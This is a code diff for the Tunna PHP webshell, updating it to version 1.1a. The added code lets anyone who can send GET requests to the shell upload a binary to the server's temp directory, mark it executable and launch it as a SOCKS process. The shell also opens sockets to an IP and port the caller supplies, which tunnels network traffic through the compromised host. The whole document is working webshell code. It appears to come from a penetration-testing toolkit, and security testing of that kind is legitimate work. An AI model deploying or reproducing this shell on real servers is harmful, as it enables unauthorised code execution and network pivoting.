@@ -1,6 +1,6 @@
 <?php
 //
-//Tunna PHP webshell v0.1 (c) 2013 by Rodrigo Marcos / Nikos Vassakis
+//Tunna PHP webshell v1.1a (c) 2014 by Nikos Vassakis
 //http://www.secforce.com / nikos.vassakis <at> secforce.com
 //
 if(!empty($_GET)){
@@ -82,7 +82,7 @@ if(!empty($_GET)){
 						$this->handler_data = "";		
 					}
 					$this->update_session_data();
-					if (!stristr(PHP_OS, "linux")){sleep(1);}	//added to work with apache/IIS on windows otherwise the consecutive reads DoS the socket
+					if (!stristr(PHP_OS, "linux")){sleep(0.2);}	//added to work with apache/IIS on windows otherwise the consecutive reads DoS the socket
 				}
 			}
 		}
@@ -92,31 +92,65 @@ if(!empty($_GET)){
 		set_time_limit(0);		//Time limit for request set to infinate for the loop function
 		$ip="";
 		$port="";
-				
-		if(session_start() === false){exit("[Server] Couldnt Start Session");}
+		$session_started=false;
 		
+		try {
+			if(session_start() === false){exit("[Server] Couldnt Start Session");}
+		} catch (Exception $e) {
+			$_SESSION['running'] == 0;
+		}
+		
+		if(isset($_GET["file"])){	//if url variable file is received
+			if(isset($_GET["upload"])){	//read binary from request and write to temp dir
+				$file = $_FILES["proxy"];
+				if ($file["error"] > 0 or empty($file)){
+					exit("[Server]: No File Selected");
+				}
+				else{
+					if(move_uploaded_file($file["tmp_name"], sys_get_temp_dir() . "/" . $file["name"])){
+						echo "[Server] File Uploaded at " . sys_get_temp_dir() . "/" . $file["name"];	
+						$_SESSION['file'] = sys_get_temp_dir() . "/" . $file["name"];
+						exit();
+					}
+					else	{
+						exit("[Server] Error Uploading File");
+					}
+				}
+			}
+		}
 		if(isset($_GET["close"])){		//if url parameter close is received the connection is closed
 			$_SESSION['running'] = -1;
 			echo "[Server] Closing the connection and killing the handler thread";
+			if(isset($_SESSION['pid'])){
+				echo "\n[Server] *Check that the socks process ".$_SESSION['pid']." is killed ";
+			}
+			if(isset($_SESSION['file'])){
+				unlink($_SESSION['file']);
+			}
 			exit();
 		}
-		if(isset($_GET["port"])){		//if port is specified connects to that port
+		if(isset($_GET["port"])){		//if port is specified in url connects to that port
 			$port=$_GET["port"];
 		}
-		if(isset($_GET["ip"])){			//if ip is specified connects to that ip
+		if(isset($_GET["ip"])){			//if ip is specified in url connects to that ip
 			$ip=$_GET["ip"];
 		}
 
-		if (!isset($_SESSION['running'])) {	//initiate the session
+		if (!isset($_SESSION['running'])) {	//1st request: initiate the session
 			$_SESSION['running'] = 0;
 			$_SESSION['met_data'] = "";
 			$_SESSION['handler_data'] = "";
 			//Closing session_write otherwise next attempt to write to session will block
 			session_write_close();
-			echo "[Server] All good to go, ensure the listener is working ;-)";
+			if (stristr(PHP_OS, "linux")){		
+				echo "[Server] All good to go, ensure the listener is working ;-)\n[FILE]:[LINUX]\n";
+			}
+			else{
+				echo "[Server] All good to go, ensure the listener is working ;-)\n[FILE]:[WIN]\n";
+			}
 		}
 		else{
-			if ($_SESSION['running'] == 0){
+			if ($_SESSION['running'] == 0){	//2nd request: get configuration options
 				$_SESSION['running'] = 1;
 				session_write_close();
 			/*
@@ -125,6 +159,26 @@ if(!empty($_GET)){
 			 * and from the request body to the socket
 			 * 
 			 */
+			 
+			 if (isset($_SESSION['file'])){
+				 $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+				 //Get Random Port
+				 socket_bind($socket, 'localhost', 0);
+				 socket_getsockname($socket, $ip, $port);
+				 socket_close($socket);
+				 //Execute
+				 if (stristr(PHP_OS, "linux")){		
+					exec("chmod +x " . $_SESSION['file']);			//if linux: need to make it an executable first	
+				}
+				//start process & save pid
+				//popen("start /B ". $_SESSION['file'], "r");	//Execute in windows
+				$proc=proc_open(($_SESSION['file']." ".$port),array(),$foo);
+				$pid=proc_get_status($proc);	
+				$_SESSION['pid']=$pid['pid'];
+				echo "[Server] Run ".$pid['pid'];
+				sleep(2);
+			 }
+				//connect
 				$mymessenger = new messenger($port,$ip);
 			}
 			else{	
@@ -142,6 +196,9 @@ if(!empty($_GET)){
 				session_write_close();
 			}
 		}
+	}
+	else{
+		echo "Tunna v1.1a"; //Version 1.1a
 	}
 }
 ?>
